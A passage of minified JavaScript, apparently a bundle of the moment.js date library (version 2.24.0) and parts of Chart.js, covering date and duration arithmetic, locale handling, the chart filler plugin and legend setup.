(this.isValid() && (y(t) && t.isValid() || zn(t).isValid())) { return Fi({ to: this, from: t }).locale(this.locale()).humanize(!e) } else { return this.localeData().invalidDate() } } function Ki(t) { return this.from(zn(), t) } function Ji(t, e) { if (this.isValid() && (y(t) && t.isValid() || zn(t).isValid())) { return Fi({ from: this, to: t }).locale(this.locale()).humanize(!e) } else { return this.localeData().invalidDate() } } function ji(t) { return this.to(zn(), t) } function $i(t) { var e; if (t === undefined) { return this._locale._abbr } else { e = An(t); if (e != null) { this._locale = e } return this } } l.defaultFormat = "YYYY-MM-DDTHH:mm:ssZ", l.defaultFormatUtc = "YYYY-MM-DDTHH:mm:ss[Z]"; var qi = G("moment().lang() is deprecated. Instead, use moment().localeData() to get the language configuration. Use moment().locale() to change languages.", function (t) { if (t === undefined) { return this.localeData() } else { return this.locale(t) } }); function to() { return this._locale } var eo = 1e3, no = 60 * eo, io = 60 * no, oo = (365 * 400 + 97) * 24 * io; function ao(t, e) { return (t % e + e) % e } function so(t, e, n) { if (t < 100 && t >= 0) { return new Date(t + 400, e, n) - oo } else { return new Date(t, e, n).valueOf() } } function ro(t, e, n) { if (t < 100 && t >= 0) { return Date.UTC(t + 400, e, n) - oo } else { return Date.UTC(t, e, n) } } function go(t) { var e; t = K(t); if (t === undefined || t === "millisecond" || !this.isValid()) { return this } var n = this._isUTC ? ro : so; switch (t) { case "year": e = n(this.year(), 0, 1); break; case "quarter": e = n(this.year(), this.month() - this.month() % 3, 1); break; case "month": e = n(this.year(), this.month(), 1); break; case "week": e = n(this.year(), this.month(), this.date() - this.weekday()); break; case "isoWeek": e = n(this.year(), this.month(), this.date() - (this.isoWeekday() - 1)); break; case "day": case "date": e = n(this.year(), this.month(), this.date()); break; case "hour": e = this._d.valueOf(); e -= ao(e + (this._isUTC ? 0 : this.utcOffset() * no), io); break; case "minute": e = this._d.valueOf(); e -= ao(e, no); break; case "second": e = this._d.valueOf(); e -= ao(e, eo); break }this._d.setTime(e); l.updateOffset(this, true); return this } function lo(t) { var e; t = K(t); if (t === undefined || t === "millisecond" || !this.isValid()) { return this } var n = this._isUTC ? ro : so; switch (t) { case "year": e = n(this.year() + 1, 0, 1) - 1; break; case "quarter": e = n(this.year(), this.month() - this.month() % 3 + 3, 1) - 1; break; case "month": e = n(this.year(), this.month() + 1, 1) - 1; break; case "week": e = n(this.year(), this.month(), this.date() - this.weekday() + 7) - 1; break; case "isoWeek": e = n(this.year(), this.month(), this.date() - (this.isoWeekday() - 1) + 7) - 1; break; case "day": case "date": e = n(this.year(), this.month(), this.date() + 1) - 1; break; case "hour": e = this._d.valueOf(); e += io - ao(e + (this._isUTC ? 0 : this.utcOffset() * no), io) - 1; break; case "minute": e = this._d.valueOf(); e += no - ao(e, no) - 1; break; case "second": e = this._d.valueOf(); e += eo - ao(e, eo) - 1; break }this._d.setTime(e); l.updateOffset(this, true); return this } function co() { return this._d.valueOf() - (this._offset || 0) * 6e4 } function Io() { return Math.floor(this.valueOf() / 1e3) } function uo() { return new Date(this.valueOf()) } function ho() { var t = this; return [t.year(), t.month(), t.date(), t.hour(), t.minute(), t.second(), t.millisecond()] } function Co() { var t = this; return { years: t.year(), months: t.month(), date: t.date(), hours: t.hours(), minutes: t.minutes(), seconds: t.seconds(), milliseconds: t.milliseconds() } } function Ao() { return this.isValid() ? this.toISOString() : null } function po() { return A(this) } function mo() { return h({}, C(this)) } function fo() { return C(this).overflow } function bo() { return { input: this._i, format: this._f, locale: this._locale, isUTC: this._isUTC, strict: this._strict } } function Bo(t, e) { at(0, [t, t.length], 0, e) } function yo(t) { return Qo.call(this, t, this.week(), this.weekday(), this.localeData()._week.dow, this.localeData()._week.doy) } function vo(t) { return Qo.call(this, t, this.isoWeek(), this.isoWeekday(), 1, 4) } function xo() { return ve(this.year(), 1, 4) } function Fo() { var t = this.localeData()._week; return ve(this.year(), t.dow, t.doy) } function Qo(t, e, n, i, o) { var a; if (t == null) { return ye(this, i, o).year } else { a = ve(t, i, o); if (e > a) { e = a } return Go.call(this, t, e, n, i, o) } } function Go(t, e, n, i, o) { var a = Be(t, e, n, i, o), s = fe(a.year, 0, a.dayOfYear); this.year(s.getUTCFullYear()); this.month(s.getUTCMonth()); this.date(s.getUTCDate()); return this } function wo(t) { return t == null ? Math.ceil((this.month() + 1) / 3) : this.month((t - 1) * 3 + this.month() % 3) } at(0, ["gg", 2], 0, function () { return this.weekYear() % 100 }), at(0, ["GG", 2], 0, function () { return this.isoWeekYear() % 100 }), Bo("gggg", "weekYear"), Bo("ggggg", "weekYear"), Bo("GGGG", "isoWeekYear"), Bo("GGGGG", "isoWeekYear"), P("weekYear", "gg"), P("isoWeekYear", "GG"), $("weekYear", 1), $("isoWeekYear", 1), wt("G", yt), wt("g", yt), wt("GG", Ct, It), wt("gg", Ct, It), wt("GGGG", ft, ht), wt("gggg", ft, ht), wt("GGGGG", bt, dt), wt("ggggg", bt, dt), Ut(["gggg", "ggggg", "GGGG", "GGGGG"], function (t, e, n, i) { e[i.substr(0, 2)] = x(t) }), Ut(["gg", "GG"], function (t, e, n, i) { e[i] = l.parseTwoDigitYear(t) }), at("Q", 0, "Qo", "quarter"), P("quarter", "Q"), $("quarter", 7), wt("Q", ct), Zt("Q", function (t, e) { e[Tt] = (x(t) - 1) * 3 }), at("D", ["DD", 2], "Do", "date"), P("date", "D"), $("date", 9), wt("D", Ct), wt("DD", Ct, It), wt("Do", function (t, e) { return t ? e._dayOfMonthOrdinalParse || e._ordinalParse : e._dayOfMonthOrdinalParseLenient }), Zt(["D", "DD"], Ht), Zt("Do", function (t, e) { e[Ht] = x(t.match(Ct)[0]) }); var Xo = Jt("Date", true); function So(t) { var e = Math.round((this.clone().startOf("day") - this.clone().startOf("year")) / 864e5) + 1; return t == null ? e : this.add(t - e, "d") } at("DDD", ["DDDD", 3], "DDDo", "dayOfYear"), P("dayOfYear", "DDD"), $("dayOfYear", 4), wt("DDD", mt), wt("DDDD", ut), Zt(["DDD", "DDDD"], function (t, e, n) { n._dayOfYear = x(t) }), at("m", ["mm", 2], 0, "minute"), P("minute", "m"), $("minute", 14), wt("m", Ct), wt("mm", Ct, It), Zt(["m", "mm"], Rt); var ko = Jt("Minutes", false); at("s", ["ss", 2], 0, "second"), P("second", "s"), $("second", 15), wt("s", Ct), wt("ss", Ct, It), Zt(["s", "ss"], Yt); var Do = Jt("Seconds", false), Zo; for (at("S", 0, 0, function () { return ~~(this.millisecond() / 100) }), at(0, ["SS", 2], 0, function () { return ~~(this.millisecond() / 10) }), at(0, ["SSS", 3], 0, "millisecond"), at(0, ["SSSS", 4], 0, function () { return this.millisecond() * 10 }), at(0, ["SSSSS", 5], 0, function () { return this.millisecond() * 100 }), at(0, ["SSSSSS", 6], 0, function () { return this.millisecond() * 1e3 }), at(0, ["SSSSSSS", 7], 0, function () { return this.millisecond() * 1e4 }), at(0, ["SSSSSSSS", 8], 0, function () { return this.millisecond() * 1e5 }), at(0, ["SSSSSSSSS", 9], 0, function () { return this.millisecond() * 1e6 }), P("millisecond", "ms"), $("millisecond", 16), wt("S", mt, ct), wt("SS", mt, It), wt("SSS", mt, ut), Zo = "SSSS"; Zo.length <= 9; Zo += "S") { wt(Zo, Bt) } function Uo(t, e) { e[Ot] = x(("0." + t) * 1e3) } for (Zo = "S"; Zo.length <= 9; Zo += "S") { Zt(Zo, Uo) } var Wo = Jt("Milliseconds", false); function No() { return this._isUTC ? "UTC" : "" } function To() { return this._isUTC ? "Coordinated Universal Time" : "" } at("z", 0, 0, "zoneAbbr"), at("zz", 0, 0, "zoneName"); var Ho = B.prototype; function Eo(t) { return zn(1e3 * t) } function Ro() { return zn.apply(null, arguments).parseZone() } function Yo(t) { return t } Ho.add = ki, Ho.calendar = Ui, Ho.clone = Wi, Ho.diff = Oi, Ho.endOf = lo, Ho.format = zi, Ho.from = Pi, Ho.fromNow = Ki, Ho.to = Ji, Ho.toNow = ji, Ho.get = qt, Ho.invalidAt = fo, Ho.isAfter = Ni, Ho.isBefore = Ti, Ho.isBetween = Hi, Ho.isSame = Ei, Ho.isSameOrAfter = Ri, Ho.isSameOrBefore = Yi, Ho.isValid = po, Ho.lang = qi, Ho.locale = $i, Ho.localeData = to, Ho.max = Kn, Ho.min = Pn, Ho.parsingFlags = mo, Ho.set = te, Ho.startOf = go, Ho.subtract = Di, Ho.toArray = ho, Ho.toObject = Co, Ho.toDate = uo, Ho.toISOString = Li, Ho.inspect = Mi, Ho.toJSON = Ao, Ho.toString = Vi, Ho.unix = Io, Ho.valueOf = co, Ho.creationData = bo, Ho.year = zt, Ho.isLeapYear = Kt, Ho.weekYear = yo, Ho.isoWeekYear = vo, Ho.quarter = Ho.quarters = wo, Ho.month = Ie, Ho.daysInMonth = ue, Ho.week = Ho.weeks = we, Ho.isoWeek = Ho.isoWeeks = Xe, Ho.weeksInYear = Fo, Ho.isoWeeksInYear = xo, Ho.date = Xo, Ho.day = Ho.days = Ye, Ho.weekday = Oe, Ho.isoWeekday = _e, Ho.dayOfYear = So, Ho.hour = Ho.hours = an, Ho.minute = Ho.minutes = ko, Ho.second = Ho.seconds = Do, Ho.millisecond = Ho.milliseconds = Wo, Ho.utcOffset = ui, Ho.utc = di, Ho.local = Ci, Ho.parseZone = Ai, Ho.hasAlignedHourOffset = pi, Ho.isDST = mi, Ho.isLocal = bi, Ho.isUtcOffset = Bi, Ho.isUtc = yi, Ho.isUTC = yi, Ho.zoneAbbr = No, Ho.zoneName = To, Ho.dates = G("dates accessor is deprecated. Use date instead.", Xo), Ho.months = G("months accessor is deprecated. Use month instead", Ie), Ho.years = G("years accessor is deprecated. Use year instead", zt), Ho.zone = G("moment().zone is deprecated, use moment().utcOffset instead. https://momentjs.com/guides/#/warnings/zone/", hi), Ho.isDSTShifted = G("isDSTShifted is deprecated. See https://momentjs.com/guides/#/warnings/dst-shifted/ for more information", fi); var Oo = U.prototype; function _o(t, e, n, i) { var o = An(); var a = d().set(i, e); return o[n](a, t) } function Vo(t, e, n) { if (c(t)) { e = t; t = undefined } t = t || ""; if (e != null) { return _o(t, e, n, "month") } var i; var o = []; for (i = 0; i < 12; i++) { o[i] = _o(t, i, n, "month") } return o } function Lo(t, e, n, i) { if (typeof t === "boolean") { if (c(e)) { n = e; e = undefined } e = e || "" } else { e = t; n = e; t = false; if (c(e)) { n = e; e = undefined } e = e || "" } var o = An(), a = t ? o._week.dow : 0; if (n != null) { return _o(e, (n + a) % 7, i, "day") } var s; var r = []; for (s = 0; s < 7; s++) { r[s] = _o(e, (s + a) % 7, i, "day") } return r } function Mo(t, e) { return Vo(t, e, "months") } function zo(t, e) { return Vo(t, e, "monthsShort") } function Po(t, e, n) { return Lo(t, e, n, "weekdays") } function Ko(t, e, n) { return Lo(t, e, n, "weekdaysShort") } function Jo(t, e, n) { return Lo(t, e, n, "weekdaysMin") } Oo.calendar = N, Oo.longDateFormat = H, Oo.invalidDate = R, Oo.ordinal = _, Oo.preparse = Yo, Oo.postformat = Yo, Oo.relativeTime = L, Oo.pastFuture = M, Oo.set = D, Oo.months = ae, Oo.monthsShort = re, Oo.monthsParse = le, Oo.monthsRegex = Ae, Oo.monthsShortRegex = de, Oo.week = xe, Oo.firstDayOfYear = Ge, Oo.firstDayOfWeek = Qe, Oo.weekdays = Ue, Oo.weekdaysMin = He, Oo.weekdaysShort = Ne, Oo.weekdaysParse = Re, Oo.weekdaysRegex = Le, Oo.weekdaysShortRegex = ze, Oo.weekdaysMinRegex = Je, Oo.isPM = nn, Oo.meridiem = on, hn("en", { dayOfMonthOrdinalParse: /\d{1,2}(th|st|nd|rd)/, ordinal: function (t) { var e = t % 10, n = x(t % 100 / 10) === 1 ? "th" : e === 1 ? "st" : e === 2 ? "nd" : e === 3 ? "rd" : "th"; return t + n } }), l.lang = G("moment.lang is deprecated. Use moment.locale instead.", hn), l.langData = G("moment.langData is deprecated. Use moment.localeData instead.", An); var jo = Math.abs; function $o() { var t = this._data; return this._milliseconds = jo(this._milliseconds), this._days = jo(this._days), this._months = jo(this._months), t.milliseconds = jo(t.milliseconds), t.seconds = jo(t.seconds), t.minutes = jo(t.minutes), t.hours = jo(t.hours), t.months = jo(t.months), t.years = jo(t.years), this } function qo(t, e, n, i) { var o = Fi(e, n); t._milliseconds += i * o._milliseconds; t._days += i * o._days; t._months += i * o._months; return t._bubble() } function ta(t, e) { return qo(this, t, e, 1) } function ea(t, e) { return qo(this, t, e, -1) } function na(t) { if (t < 0) { return Math.floor(t) } else { return Math.ceil(t) } } function ia() { var t, e, n, i, o, a = this._milliseconds, s = this._days, r = this._months, g = this._data; if (!(0 <= a && 0 <= s && 0 <= r || a <= 0 && s <= 0 && r <= 0)) a += 864e5 * na(aa(r) + s), r = s = 0; return g.milliseconds = a % 1e3, t = v(a / 1e3), g.seconds = t % 60, e = v(t / 60), g.minutes = e % 60, n = v(e / 60), g.hours = n % 24, s += v(n / 24), o = v(oa(s)), r += o, s -= na(aa(o)), i = v(r / 12), r %= 12, g.days = s, g.months = r, g.years = i, this } function oa(t) { return t * 4800 / 146097 } function aa(t) { return t * 146097 / 4800 } function sa(t) { if (!this.isValid()) return NaN; var e, n, i = this._milliseconds; if ("month" === (t = K(t)) || "quarter" === t || "year" === t) switch (e = this._days + i / 864e5, n = this._months + oa(e), t) { case "month": return n; case "quarter": return n / 3; case "year": return n / 12 } else switch (e = this._days + Math.round(aa(this._months)), t) { case "week": return e / 7 + i / 6048e5; case "day": return e + i / 864e5; case "hour": return 24 * e + i / 36e5; case "minute": return 1440 * e + i / 6e4; case "second": return 86400 * e + i / 1e3; case "millisecond": return Math.floor(864e5 * e) + i; default: throw new Error("Unknown unit " + t) } } function ra() { return this.isValid() ? this._milliseconds + 864e5 * this._days + this._months % 12 * 2592e6 + 31536e6 * x(this._months / 12) : NaN } function ga(t) { return function () { return this.as(t) } } var la = ga("ms"), ca = ga("s"), Ia = ga("m"), ua = ga("h"), ha = ga("d"), da = ga("w"), Ca = ga("M"), Aa = ga("Q"), pa = ga("y"); function ma() { return Fi(this) } function fa(t) { return t = K(t), this.isValid() ? this[t + "s"]() : NaN } function ba(t) { return function () { return this.isValid() ? this._data[t] : NaN } } var Ba = ba("milliseconds"), ya = ba("seconds"), va = ba("minutes"), xa = ba("hours"), Fa = ba("days"), Qa = ba("months"), Ga = ba("years"); function wa() { return v(this.days() / 7) } var Xa = Math.round, Sa = { ss: 44, s: 45, m: 45, h: 22, d: 26, M: 11 }; function ka(t, e, n, i, o) { return o.relativeTime(e || 1, !!n, t, i) } function Da(t, e, n) { var i = Fi(t).abs(), o = Xa(i.as("s")), a = Xa(i.as("m")), s = Xa(i.as("h")), r = Xa(i.as("d")), g = Xa(i.as("M")), l = Xa(i.as("y")), c = (o <= Sa.ss ? ["s", o] : o < Sa.s && ["ss", o]) || a <= 1 && ["m"] || a < Sa.m && ["mm", a] || s <= 1 && ["h"] || s < Sa.h && ["hh", s] || r <= 1 && ["d"] || r < Sa.d && ["dd", r] || g <= 1 && ["M"] || g < Sa.M && ["MM", g] || l <= 1 && ["y"] || ["yy", l]; return c[2] = e, c[3] = 0 < +t, c[4] = n, function (t, e, n, i, o) { return o.relativeTime(e || 1, !!n, t, i) }.apply(null, c) } function Za(t) { return void 0 !== t ? "function" == typeof t && (Xa = t, !0) : Xa } function Ua(t, e) { if (void 0 === Sa[t]) return !1; if (void 0 === e) return Sa[t]; if (Sa[t] = e, "s" === t) Sa.ss = e - 1; return !0 } function Wa(t) { if (!this.isValid()) return this.localeData().invalidDate(); var e = this.localeData(), n = function (t, e, n) { var i = Fi(t).abs(), o = Xa(i.as("s")), a = Xa(i.as("m")), s = Xa(i.as("h")), r = Xa(i.as("d")), g = Xa(i.as("M")), l = Xa(i.as("y")), c = (o <= Sa.ss ? ["s", o] : o < Sa.s && ["ss", o]) || a <= 1 && ["m"] || a < Sa.m && ["mm", a] || s <= 1 && ["h"] || s < Sa.h && ["hh", s] || r <= 1 && ["d"] || r < Sa.d && ["dd", r] || g <= 1 && ["M"] || g < Sa.M && ["MM", g] || l <= 1 && ["y"] || ["yy", l]; return c[2] = e, c[3] = 0 < +t, c[4] = n, function (t, e, n, i, o) { return o.relativeTime(e || 1, !!n, t, i) }.apply(null, c) }(this, !t, e); if (t) n = e.pastFuture(+this, n); return e.postformat(n) } var Na = Math.abs; function Ta(t) { return (t > 0) - (t < 0) || +t } function Ha() { if (!this.isValid()) { return this.localeData().invalidDate() } var t = Na(this._milliseconds) / 1e3; var e = Na(this._days); var n = Na(this._months); var i, o, a; i = v(t / 60); o = v(i / 60); t %= 60; i %= 60; a = v(n / 12); n %= 12; var s = a; var r = n; var g = e; var l = o; var c = i; var I = t ? t.toFixed(3).replace(/\.?0+$/, "") : ""; var u = this.asSeconds(); if (!u) { return "P0D" } var h = u < 0 ? "-" : ""; var d = Ta(this._months) !== Ta(u) ? "-" : ""; var C = Ta(this._days) !== Ta(u) ? "-" : ""; var A = Ta(this._milliseconds) !== Ta(u) ? "-" : ""; return h + "P" + (s ? d + s + "Y" : "") + (r ? d + r + "M" : "") + (g ? C + g + "D" : "") + (l || c || I ? "T" : "") + (l ? A + l + "H" : "") + (c ? A + c + "M" : "") + (I ? A + I + "S" : "") } var Ea = oi.prototype; return Ea.isValid = function () { return this._isValid }, Ea.abs = function () { var t = this._data; return this._milliseconds = jo(this._milliseconds), this._days = jo(this._days), this._months = jo(this._months), t.milliseconds = jo(t.milliseconds), t.seconds = jo(t.seconds), t.minutes = jo(t.minutes), t.hours = jo(t.hours), t.months = jo(t.months), t.years = jo(t.years), this }, Ea.add = function (t, e) { return qo(this, t, e, 1) }, Ea.subtract = function (t, e) { return qo(this, t, e, -1) }, Ea.as = function (t) { if (!this.isValid()) return NaN; var e, n, i = this._milliseconds; if ("month" === (t = K(t)) || "quarter" === t || "year" === t) switch (e = this._days + i / 864e5, n = this._months + oa(e), t) { case "month": return n; case "quarter": return n / 3; case "year": return n / 12 } else switch (e = this._days + Math.round(aa(this._months)), t) { case "week": return e / 7 + i / 6048e5; case "day": return e + i / 864e5; case "hour": return 24 * e + i / 36e5; case "minute": return 1440 * e + i / 6e4; case "second": return 86400 * e + i / 1e3; case "millisecond": return Math.floor(864e5 * e) + i; default: throw new Error("Unknown unit " + t) } }, Ea.asMilliseconds = la, Ea.asSeconds = ca, Ea.asMinutes = Ia, Ea.asHours = ua, Ea.asDays = ha, Ea.asWeeks = da, Ea.asMonths = Ca, Ea.asQuarters = Aa, Ea.asYears = pa, Ea.valueOf = function () { return this.isValid() ? this._milliseconds + 864e5 * this._days + this._months % 12 * 2592e6 + 31536e6 * x(this._months / 12) : NaN }, Ea._bubble = function () { var t, e, n, i, o, a = this._milliseconds, s = this._days, r = this._months, g = this._data; 0 <= a && 0 <= s && 0 <= r || a <= 0 && s <= 0 && r <= 0 || (a += 864e5 * na(aa(r) + s), r = s = 0); return g.milliseconds = a % 1e3, t = v(a / 1e3), g.seconds = t % 60, e = v(t / 60), g.minutes = e % 60, n = v(e / 60), g.hours = n % 24, s += v(n / 24), o = v(oa(s)), r += o, s -= na(aa(o)), i = v(r / 12), r %= 12, g.days = s, g.months = r, g.years = i, this }, Ea.clone = function () { return Fi(this) }, Ea.get = function (t) { return t = K(t), this.isValid() ? this[t + "s"]() : NaN }, Ea.milliseconds = Ba, Ea.seconds = ya, Ea.minutes = va, Ea.hours = xa, Ea.days = Fa, Ea.weeks = function () { return v(this.days() / 7) }, Ea.months = Qa, Ea.years = Ga, Ea.humanize = function (t) { if (!this.isValid()) return this.localeData().invalidDate(); var e = this.localeData(), n = function (t, e, n) { var i = Fi(t).abs(), o = Xa(i.as("s")), a = Xa(i.as("m")), s = Xa(i.as("h")), r = Xa(i.as("d")), g = Xa(i.as("M")), l = Xa(i.as("y")), c = (o <= Sa.ss ? ["s", o] : o < Sa.s && ["ss", o]) || a <= 1 && ["m"] || a < Sa.m && ["mm", a] || s <= 1 && ["h"] || s < Sa.h && ["hh", s] || r <= 1 && ["d"] || r < Sa.d && ["dd", r] || g <= 1 && ["M"] || g < Sa.M && ["MM", g] || l <= 1 && ["y"] || ["yy", l]; return c[2] = e, c[3] = 0 < +t, c[4] = n, function (t, e, n, i, o) { return o.relativeTime(e || 1, !!n, t, i) }.apply(null, c) }(this, !t, e); t && (n = e.pastFuture(+this, n)); return e.postformat(n) }, Ea.toISOString = Ha, Ea.toString = Ha, Ea.toJSON = Ha, Ea.locale = $i, Ea.localeData = to, Ea.toIsoString = G("toIsoString() is deprecated. Please use toISOString() instead (notice the capitals)", Ha), Ea.lang = qi, at("X", 0, 0, "unix"), at("x", 0, 0, "valueOf"), wt("x", yt), wt("X", /[+-]?\d+(\.\d{1,3})?/), Zt("X", function (t, e, n) { n._d = new Date(1e3 * parseFloat(t, 10)) }), Zt("x", function (t, e, n) { n._d = new Date(x(t)) }), l.version = "2.24.0", function (t) { e = t }(zn), l.fn = Ho, l.min = function () { return Jn("isBefore", [].slice.call(arguments, 0)) }, l.max = function () { return Jn("isAfter", [].slice.call(arguments, 0)) }, l.now = function () { return Date.now ? Date.now() : +new Date }, l.utc = d, l.unix = function (t) { return zn(1e3 * t) }, l.months = function (t, e) { return Vo(t, e, "months") }, l.isDate = I, l.locale = hn, l.invalid = p, l.duration = Fi, l.isMoment = y, l.weekdays = function (t, e, n) { return Lo(t, e, n, "weekdays") }, l.parseZone = function () { return zn.apply(null, arguments).parseZone() }, l.localeData = An, l.isDuration = ai, l.monthsShort = function (t, e) { return Vo(t, e, "monthsShort") }, l.weekdaysMin = function (t, e, n) { return Lo(t, e, n, "weekdaysMin") }, l.defineLocale = dn, l.updateLocale = function (t, e) { { var n, i, o; null != e ? (o = sn, null != (i = un(t)) && (o = i._config), e = Z(o, e), (n = new U(e)).parentLocale = rn[t], rn[t] = n, hn(t)) : null != rn[t] && (null != rn[t].parentLocale ? rn[t] = rn[t].parentLocale : null != rn[t] && delete rn[t]) } return rn[t] }, l.locales = function () { return X(rn) }, l.weekdaysShort = function (t, e, n) { return Lo(t, e, n, "weekdaysShort") }, l.normalizeUnits = K, l.relativeTimeRounding = function (t) { return void 0 !== t ? "function" == typeof t && (Xa = t, !0) : Xa }, l.relativeTimeThreshold = function (t, e) { if (void 0 === Sa[t]) return !1; if (void 0 === e) return Sa[t]; Sa[t] = e, "s" === t && (Sa.ss = e - 1); return !0 }, l.calendarFormat = function (t, e) { var n = t.diff(e, "days", !0); return n < -6 ? "sameElse" : n < -1 ? "lastWeek" : n < 0 ? "lastDay" : n < 1 ? "sameDay" : n < 2 ? "nextDay" : n < 7 ? "nextWeek" : "sameElse" }, l.prototype = Ho, l.HTML5_FMT = { DATETIME_LOCAL: "YYYY-MM-DDTHH:mm", DATETIME_LOCAL_SECONDS: "YYYY-MM-DDTHH:mm:ss", DATETIME_LOCAL_MS: "YYYY-MM-DDTHH:mm:ss.SSS", DATE: "YYYY-MM-DD", TIME: "HH:mm", TIME_SECONDS: "HH:mm:ss", TIME_MS: "HH:mm:ss.SSS", WEEK: "GGGG-[W]WW", MONTH: "YYYY-MM" }, l }() }(Pn = { exports: {} }), Pn.exports), jn = { datetime: "MMM D, YYYY, h:mm:ss a", millisecond: "h:mm:ss.SSS a", second: "h:mm:ss a", minute: "h:mm a", hour: "hA", day: "MMM D", week: "ll", month: "MMM YYYY", quarter: "[Q]Q - YYYY", year: "YYYY" }; an._date.override("function" == typeof Jn ? { _id: "moment", formats: function () { return jn }, parse: function (t, e) { return "string" == typeof t && "string" == typeof e ? t = Jn(t, e) : t instanceof Jn || (t = Jn(t)), t.isValid() ? t.valueOf() : null }, format: function (t, e) { return Jn(t).format(e) }, add: function (t, e, n) { return Jn(t).add(e, n).valueOf() }, diff: function (t, e, n) { return Jn.duration(Jn(t).diff(Jn(e))).as(n) }, startOf: function (t, e, n) { return t = Jn(t), "isoWeek" === e ? t.isoWeekday(n).valueOf() : t.startOf(e).valueOf() }, endOf: function (t, e) { return Jn(t).endOf(e).valueOf() }, _create: function (t) { return Jn(t) } } : {}), st._set("global", { plugins: { filler: { propagate: !0 } } }); var $n = { dataset: function (t) { var e = t.fill, n = t.chart, i = n.getDatasetMeta(e), o = i && n.isDatasetVisible(e) && i.dataset._children || [], a = o.length || 0; return a ? function (t, e) { return e < a && o[e]._view || null } : null }, boundary: function (t) { var e = t.boundary, n = e ? e.x : null, i = e ? e.y : null; return function (t) { return { x: null === n ? t.x : n, y: null === i ? t.y : i } } } }; function qn(t) { return t && !t.skip } function ti(t, e, n, i, o) { var a; if (i && o) { for (t.moveTo(e[0].x, e[0].y), a = 1; a < i; ++a)lt.canvas.lineTo(t, e[a - 1], e[a]); for (t.lineTo(n[o - 1].x, n[o - 1].y), a = o - 1; 0 < a; --a)lt.canvas.lineTo(t, n[a], n[a - 1], !0) } } var ei = { id: "filler", afterDatasetsUpdate: function (t, e) { for (var n, i, o, a, s, r, g = (t.data.datasets || []).length, l = e.propagate, c = [], I = 0; I < g; ++I)o = null, (i = (n = t.getDatasetMeta(I)).dataset) && i._model && i instanceof Tt.Line && (o = { visible: t.isDatasetVisible(I), fill: function (t, e, n) { var i, o = t._model || {}, a = o.fill; if (void 0 === a && (a = !!o.backgroundColor), !1 === a || null === a) return !1; if (!0 === a) return "origin"; if (i = parseFloat(a, 10), isFinite(i) && Math.floor(i) === i) return "-" !== a[0] && "+" !== a[0] || (i = e + i), !(i === e || i < 0 || n <= i) && i; switch (a) { case "bottom": return "start"; case "top": return "end"; case "zero": return "origin"; case "origin": case "start": case "end": return a; default: return !1 } }(i, I, g), chart: t, el: i }), n.$filler = o, c.push(o); for (I = 0; I < g; ++I)(o = c[I]) && (o.fill = function (t, e, n) { var i, o = t[e].fill, a = [e]; if (!n) return o; for (; !1 !== o && -1 === a.indexOf(o);) { if (!isFinite(o)) return o; if (!(i = t[o])) return !1; if (i.visible) return o; a.push(o), o = i.fill } return !1 }(c, I, l), o.boundary = function (t) { var e, n = t.el._model || {}, i = t.el._scale || {}, o = t.fill, a = null; if (isFinite(o)) return null; if ("start" === o ? a = void 0 === n.scaleBottom ? i.bottom : n.scaleBottom : "end" === o ? a = void 0 === n.scaleTop ? i.top : n.scaleTop : void 0 !== n.scaleZero ? a = n.scaleZero : i.getBasePosition ? a = i.getBasePosition() : i.getBasePixel && (a = i.getBasePixel()), null != a) { if (void 0 !== a.x && void 0 !== a.y) return a; if (lt.isFinite(a)) return { x: (e = i.isHorizontal()) ? a : null, y: e ? null : a } } return null }(o), o.mapper = (r = void 0, s = (a = o).fill, !(r = "dataset") === s ? null : (isFinite(s) || (r = "boundary"), $n[r](a)))) }, beforeDatasetDraw: function (t, e) { var n, i, o, a, s, r, g = e.meta.$filler; g && (n = t.ctx, o = (i = g.el)._view, a = i._children || [], s = g.mapper, r = o.backgroundColor || st.global.defaultColor, s && r && a.length && (lt.canvas.clipArea(n, t.chartArea), function (t, e, n, i, o, a) { var s, r, g, l, c, I, u, h = e.length, d = i.spanGaps, C = [], A = [], p = 0, m = 0; for (t.beginPath(), s = 0, r = h + !!a; s < r; ++s)c = n(l = e[g = s % h]._view, g, i), I = qn(l), u = qn(c), I && u ? (p = C.push(l), m = A.push(c)) : p && m && (d ? (I && C.push(l), u && A.push(c)) : (ti(t, C, A, p, m), p = m = 0, C = [], A = [])); ti(t, C, A, p, m), t.closePath(), t.fillStyle = o, t.fill() }(n, a, s, o, r, i._loop), lt.canvas.unclipArea(n))) } }, ni = lt.noop, ii = lt.valueOrDefault; function oi(t, e) { return t.usePointStyle && t.boxWidth > e ? e : t.boxWidth } st._set("global", { legend: { display: !0, position: "top", fullWidth: !0, reverse: !1, weight: 1e3, onClick: function (t, e) { var n = e.datasetIndex, i = this.chart, o = i.getDatasetMeta(n); o.hidden = null === o.hidden ? !i.data.datasets[n].hidden : null, i.update() }, onHover: null, onLeave: null, labels: { boxWidth: 40, padding: 10, generateLabels: function (n) { var t = n.data; return lt.isArray(t.datasets) ? t.datasets.map(function (t, e) { return { text: t.label, fillStyle: lt.isArray(t.backgroundColor) ? t.backgroundColor[0] : t.backgroundColor, hidden: !n.isDatasetVisible(e), lineCap: t.borderCapStyle, lineDash: t.borderDash, lineDashOffset: t.borderDashOffset, lineJoin: t.borderJoinStyle, lineWidth: t.borderWidth, strokeStyle: t.borderColor, pointStyle: t.pointStyle, datasetIndex: e } }, this) : [] } } }, legendCallback: function (t) { var e = []; e.push('<ul class="' + t.id + '-legend">'); for (var n = 0; n < t.data.datasets.length; n++)e.push('<li><span style="background-color:' + t.data.datasets[n].backgroundColor + '"></span>'), t.data.datasets[n].label && e.push(t.data.datasets[n].label), e.push("</li>"); return e.push("</ul>"), e.join("") } }); var ai = ht.extend({ initialize: function (t) { lt.extend(this, t), this.legendHitBoxes = [], this._hoveredItem = null, this.doughnutMode = !1 }, beforeUpdate: ni, update: function (t, e, n) { var i = this; return i.beforeUpdate(), i.maxWidth = t, i.maxHeight = e, i.margins = n, i.beforeSetDimensions(), i.setDimensions(), i.afterSetDimensions(), i.beforeBuildLabels(), i.buildLabels(), i.afterBuildLabels(), i.beforeFit(), i.fit(), i.afterFit(), i.afterUpdate(), i.minSize }, afterUpdate: ni, beforeSetDimensions: ni, setDimensions: function () { var t = this; t.isHorizontal() ? (t.width = t.maxWidth, t.left = 0, t.right = t.width) : (t.height = t.maxHeight, t.top = 0, t.bottom = t.height), t.paddingLeft = 0, t.paddingTop = 0, t.paddingRight = 0, t.paddingBottom = 0, t.minSize = { width: 0, height: 0 } }, afterSetDimensions: ni, beforeBuildLabels: ni, buildLabels: function () { var e = this, n = e.options.labels || {}, t = lt.callback(n.generateLabels, [e.chart], e) || []; n.filter && (t = t.filter(function (t) { return n.filter(t, e.chart.data) })), e.options.reverse && 